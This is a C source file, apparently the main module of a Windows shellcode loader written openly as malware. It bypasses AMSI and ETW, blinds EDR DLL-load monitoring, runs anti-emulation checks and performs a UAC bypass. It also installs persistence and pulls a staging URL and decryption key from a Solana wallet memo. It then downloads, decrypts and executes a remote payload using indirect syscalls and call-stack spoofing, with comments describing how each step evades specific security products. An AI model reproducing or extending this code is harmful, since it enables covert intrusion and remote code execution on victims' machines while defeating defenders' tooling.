// =============================================
// main.c - Shellcode Loader
//
// Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
// Memory:   Phantom DLL Hollowing -> Module Stomp -> NtAllocateVirtualMemory
// Thread:   Thread pool callback (TpAllocWork/TpPostWork)
// Stack:    Call gadget injection + tail-call spoofing
// Syscalls: Indirect with randomized gadget pool
// Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
// Compress: LZNT1 via ntdll (optional, per-build)
// =============================================

#include "Common.h"

// NOTE: No static encoded URL or key data — both live on-chain.
// FetchSolMemo() in Solana.c queries the Solana JSON-RPC API at runtime
// to retrieve the staging URL + Chaskey key/nonce from the beacon wallet's
// oldest transaction memo.  Only the wallet address is compiled in (Payload.h).

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };
    NTSTATUS    STATUS  = 0x00;

    // --- IAT Camouflage ---
    IatCamouflage();
    LOG("[*] Main entry");

    // --- Anti-Analysis (skipped in DEBUG builds) ---
#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
    // Anti-emulation: burn mpengine's wall-clock budget + detect emulator
    // characteristics (RDRAND determinism, CPUID hypervisor brand). Defender
    // emulates the first 10-100k instructions of a sample; if we don't bail
    // here we still execute on real silicon, but the emulator may sign us
    // based on emulated behaviour. Caller passes pApi NULL since WinApi
    // hashing hasn't been initialized yet; AntiEmulation uses intrinsics only.
    if (!AntiEmulation(NULL))
        return 0;
#endif

    // --- Initialize indirect syscall engine ---
    // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
    if (!InitializeNtSyscalls(&NtApis))
        return 0;
    LOG("[+] Syscalls initialized");

    // --- Initialize WinAPI function pointers (PEB hash walking) ---
    if (!InitializeWinApis(&WinApis))
        return 0;
    LOG("[+] WinApis initialized");

    // --- Blind EDR DLL load monitoring ---
    // Removes all LdrRegisterDllNotification callbacks so EDR
    // can't see subsequent LoadLibrary calls (amsi, wininet, ktmw32)
    BlindDllNotifications(&WinApis);

    // --- Shuffled DLL preload ---
    // Load the three flow-critical DLLs in per-run randomized order so
    // kernel ETW image-load sequence can't be learned by ML baselining.
    // Subsequent LoadLibraryA calls in Evasion/Staging/Stomper hit the
    // loader cache and emit no further image-load events.
    BYTE xAmsi[]    = XSTR_AMSI_DLL;    DEOBF(xAmsi);
    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
    BYTE xKtm[]     = XSTR_KTMW32_DLL;  DEOBF(xKtm);
    LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet, (LPCSTR)xKtm };
    ShufflePreloadLibraries(&WinApis, preload, 3);

    // --- Patchless AMSI/ETW bypass ---
    // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
    // NtContinue sets DR0/DR1 without ETW-TI telemetry
    PatchlessAmsiEtw(&WinApis);

    // --- UAC bypass + self-install (UAC builds only) ---
    // Two-process AppInfo RPC bypass (no manifest, no UAC dialog):
    //   Medium-IL first run  → AppInfo bypass → spawn elevated self → terminate → return FALSE
    //   Elevated second run  → IsFirstRunProcess=TRUE → InstallAndTerminate → exits
    //   msoia.exe (run-key)  → IsFirstRunProcess=FALSE → fall through to shellcode
#if defined(UAC_BYPASS) && !defined(BUILD_DLL)
    if (!UacBypass(&WinApis)) return 0;
    if (IsFirstRunProcess(&WinApis)) {
        InstallAndTerminate(&WinApis);
        return 0;
    }
#endif

    // --- Resolve URL + key + nonce from Solana beacon ---
    // FetchSolMemo queries api.mainnet-beta.solana.com (or the custom RPC host
    // encoded in Payload.h) for the wallet's oldest transaction, reads the SPL
    // Memo, and parses: <url>|<32-hex-key>|<24-hex-nonce>.
    // No URL or crypto key is embedded anywhere in this binary.
    PCHAR pStagingUrl   = NULL;
    BYTE  aKey[KEY_SIZE] = { 0 };
    BYTE  aNonce[12]     = { 0 };
    DWORD dwOrigSize    = 0;
    BOOL  bCompressed   = FALSE;

    LOG("[*] Resolving beacon from Solana...");
    if (!FetchSolMemo(&WinApis, &pStagingUrl, aKey, aNonce, &dwOrigSize, &bCompressed))
        return 0;

    // --- Download encrypted payload ---
    PBYTE pPayload      = NULL;
    DWORD dwPayloadSize = 0;

    LOG("[*] Downloading payload...");
    if (!DownloadPayload(&WinApis, pStagingUrl, &pPayload, &dwPayloadSize)) {
        MemSet(aKey,   0, KEY_SIZE);
        MemSet(aNonce, 0, sizeof(aNonce));
        SIZE_T urlLen = StrLenA(pStagingUrl);
        MemSet(pStagingUrl, 0, urlLen);
        HeapFree(GetProcessHeap(), 0, pStagingUrl);
        return 0;
    }
    // Wipe URL immediately — it was only needed for the download
    {
        SIZE_T urlLen = StrLenA(pStagingUrl);
        MemSet(pStagingUrl, 0, urlLen);
        HeapFree(GetProcessHeap(), 0, pStagingUrl);
        pStagingUrl = NULL;
    }
    LOG("[+] Payload loaded");

    // --- Decrypt with Chaskey-CTR ---
    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, aKey, aNonce)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        MemSet(aKey,   0, KEY_SIZE);
        MemSet(aNonce, 0, sizeof(aNonce));
        return 0;
    }
    LOG("[+] Payload decrypted");

    // Wipe key material immediately
    MemSet(aKey,   0, KEY_SIZE);
    MemSet(aNonce, 0, sizeof(aNonce));

    // --- Decompress (if payload was LZNT1-compressed) ---
    // bCompressed and dwOrigSize come from the on-chain memo, not from
    // compile-time defines — the same binary handles any future payload.
    PBYTE pShellcode      = pPayload;
    DWORD dwShellcodeSize = dwPayloadSize;

    if (bCompressed) {
        PBYTE pDecompressed = NULL;
        if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, dwOrigSize)) {
            LOG("[!] Decompression failed");
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }
        LOG("[+] Payload decompressed");

        MemSet(pPayload, 0, dwPayloadSize);
        HeapFree(GetProcessHeap(), 0, pPayload);
        pShellcode      = pDecompressed;
        dwShellcodeSize = dwOrigSize;
    }

    // ============================================================
    // Stage 1: Shellcode Placement (3-tier fallback)
    //
    // 1. Phantom DLL Hollowing (NTFS Transactions)
    //    - Section backed by rolled-back transacted file
    //    - EDR can't verify memory against disk (FILE_OBJECT mismatch)
    //    - Requires write access to System32 DLL (elevated)
    //
    // 2. Module Stomping
    //    - LoadLibrary + overwrite .text section
    //    - Memory attributed to signed DLL
    //    - Detectable by EDR integrity checks (disk vs memory)
    //
    // 3. NtAllocateVirtualMemory (last resort)
    //    - Private memory (most suspicious)
    //    - Always works regardless of shellcode size
    //
    // Memory protection is controlled by SHELLCODE_EXEC_PROT:
    //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
    //   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
    // ============================================================

    PVOID pExec   = NULL;
    BOOL  bPlaced = FALSE;

    // 4-tier placement fallback (P1-A). Order is "least Defender-attention
    // first":
    //
    //   1. ModuleStomp     — pure in-memory write to a signed DLL's .text;
    //                        no NTFS transaction, no FILE_OBJECT trickery.
    //                        Defender MpFilter has no hook here.
    //   2. GhostlyHollow   — FILE_FLAG_DELETE_ON_CLOSE + SEC_IMAGE. Avoids
    //                        the transaction path that previously fired
    //                        `transactionfile:...` alerts. Shellcode is
    //                        written XOR-encrypted; decrypted in-memory.
    //   3. PhantomDllHollow — NTFS-transaction-backed image section. Still
    //                        the strongest disk-vs-memory mismatch, but
    //                        Defender's MpFilter is transaction-aware
    //                        since 2022, so we wrote the shellcode XOR'd
    //                        (P2-E) — Defender sees garbage in the
    //                        in-flight transaction view.
    //   4. NtAllocate      — private RW->RX allocation. Loudest path
    //                        (Elastic correlates against unbacked memory).
    //                        Last resort.
    //bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
    //if (bPlaced) {
    //    LOG("[+] Shellcode placed via module stomping");
    //}

    //if (!bPlaced) {
    //    bPlaced = GhostlyHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
    //    if (bPlaced) {
    //        LOG("[+] Shellcode placed via ghostly hollowing");
    //    }
    //}

    //if (!bPlaced) {
    //    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
    //    if (bPlaced) {
    //        LOG("[+] Shellcode placed via phantom DLL hollowing");
    //    }
    //}

    // NtAllocate: direct allocation (RW -> copy -> RX/RWX)
    if (!bPlaced) {
        LOG("[*] Fallback to NtAllocateVirtualMemory");

        SIZE_T sRegion = (SIZE_T)dwShellcodeSize;
        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
            0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pShellcode);
            return 0;
        }

        MemCopy(pExec, pShellcode, dwShellcodeSize);

        // Change from RW to executable (RX or RWX)
        ULONG   dwOldProt  = 0;
        SIZE_T  sProtSize  = (SIZE_T)dwShellcodeSize;
        PVOID   pProtAddr  = pExec;

        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
            (ULONG_PTR)&sProtSize, (ULONG_PTR)SHELLCODE_EXEC_PROT,
            (ULONG_PTR)&dwOldProt,
            0, 0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pShellcode);
            return 0;
        }
    }

    // Wipe original payload from heap
    MemSet(pShellcode, 0, dwShellcodeSize);
    HeapFree(GetProcessHeap(), 0, pShellcode);

    // ============================================================
    // Cleanup: Remove evasion artifacts before shellcode runs
    //
    // - Remove VEH handler (no longer needed)
    // - Clear debug register target addresses
    // - Wipe decoded strings from stack/globals
    // ============================================================

    CleanupEvasion(&WinApis);
    LOG("[+] Evasion cleanup complete");

    // --- Install persistence (non-UAC builds only) ---
    // UAC builds persist via InstallAndTerminate above (called before shellcode load).
#ifndef UAC_BYPASS
    InstallPersistence(&WinApis);
    LOG("[+] Persistence installed");
#endif

    // ============================================================
    // Stage 2: Call Stack Spoofing + Callback Execution
    //
    // Find a 'call rbx' (FF D3) gadget in ntdll to inject a
    // legitimate stack frame. Combined with module stomping or
    // phantom hollowing, the full call stack looks clean:
    //
    //   shellcode RIP  (in stomped/phantom DLL .text)
    //   -> gadget site  (in ntdll — 'call rbx' return addr)
    //   -> TppWorkpExecute     (ntdll)
    //   -> TppWorkerThread     (ntdll)
    //   -> RtlUserThreadStart  (ntdll)
    // ============================================================

    // Harvest `call rbx` gadgets across ntdll / kernel32 / kernelbase,
    // then pick one per-run via RDTSC. Using a pool instead of a fixed
    // single ntdll gadget defeats EDR rules that flag high-frequency
    // identical return addresses in the injected stack frame.
    CollectCallGadgets();
    PVOID pCallGadget = GetRandomCallGadget();

    // Store target + gadget for the ASM callback wrapper
    SetSpoofTarget(pExec, pCallGadget);

    // #9 Draugr MVP (opt-in, disabled by default — see Common.h).
    // Builds a 1 MB synthetic stack whose top contains three fake
    // return addresses pointing into RtlUserThreadStart /
    // BaseThreadInitThunk / NtWaitForSingleObject. SpoofCallback swaps
    // RSP to this buffer before jumping to shellcode so kernel call-
    // stack walkers see a plausible fresh-thread chain.
#ifdef ENABLE_SYNTHETIC_STACK
    SetSpoofStack(BuildSyntheticStack(&WinApis));
#else
    SetSpoofStack(NULL);
#endif

    // pNtdll needed below for thread-pool fallback path
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);

    // ============================================================
    // #12 Poison Fiber kick-off
    //
    // Converts the main thread to a fiber and switches to a new
    // fiber whose entry is SpoofCallback. No new OS thread is
    // created → no PsSetCreateThreadNotifyRoutine callback fires,
    // blinding all kernel-thread-callback-based EDRs.
    //
    // SwitchToFiber never returns to main (shellcode runs forever on
    // the fiber stack). If any fiber API fails we fall back to the
    // original thread-pool path, which is still call-stack spoofed.
    // ============================================================
#if 0  // Fiber path temporarily disabled — thread-pool fallback only
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");

    BYTE xConv[]   = XSTR_CONVERT_THREAD_TO_FIBER; DEOBF(xConv);
    BYTE xCreate[] = XSTR_CREATE_FIBER;            DEOBF(xCreate);
    BYTE xSwitch[] = XSTR_SWITCH_TO_FIBER;         DEOBF(xSwitch);

    typedef LPVOID (WINAPI *fnConvertThreadToFiber)(LPVOID);
    typedef LPVOID (WINAPI *fnCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
    typedef VOID   (WINAPI *fnSwitchToFiber)(LPVOID);

    fnConvertThreadToFiber pConvert = pKernel32
        ? (fnConvertThreadToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xConv)
        : NULL;
    fnCreateFiber pCreate = pKernel32
        ? (fnCreateFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xCreate)
        : NULL;
    fnSwitchToFiber pSwitch = pKernel32
        ? (fnSwitchToFiber)WinApis.pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xSwitch)
        : NULL;

    if (pConvert && pCreate && pSwitch) {
        LPVOID pMainFiber = pConvert(NULL);
        if (pMainFiber) {
            // SpoofCallback's NTAPI ABI matches LPFIBER_START_ROUTINE
            // on x64 (single LPVOID in RCX, no shadow-space consumption).
            LPVOID pShellcodeFiber = pCreate(0, (LPFIBER_START_ROUTINE)SpoofCallback, NULL);
            if (pShellcodeFiber) {
                LOG("[*] Switching to shellcode fiber...");
                pSwitch(pShellcodeFiber);     // never returns
                return 0;
            }
        }
        LOG("[!] Fiber path failed, falling back to thread pool");
    }
#endif

    // Thread-pool workers have their own legit TppWorkerThread ->
    // RtlUserThreadStart chain on their native stack, which is more
    // convincing than our synthetic buffer. Disable the RSP swap so
    // the fallback path keeps that natural chain.
    SetSpoofStack(NULL);

    // ----- Thread-pool fallback path (original behaviour) -----
    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return 0;

    PVOID pWork = NULL;
    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
    if (!NT_SUCCESS(STATUS) || !pWork)
        return 0;

    LOG("[*] Executing via thread pool callback (spoofed stack)...");
    pTpPostWork(pWork);

    // Keep process alive via alertable wait on NtCurrentProcess pseudo-handle.
    // Alertable=TRUE → thread WaitReason = UserRequest (not DelayExecution),
    // avoiding Hunt-Sleeping-Beacons / BeaconHunter thread-state fingerprints.
    while (TRUE) {
        SET_SYSCALL(NtApis.NtWaitForSingleObject);
        RunSyscall(
            (ULONG_PTR)(HANDLE)-1,  // NtCurrentProcess()
            (ULONG_PTR)TRUE,        // Alertable
            (ULONG_PTR)NULL,        // Infinite timeout
            0, 0, 0, 0, 0, 0, 0, 0, 0
        );
    }

    return 0;
}
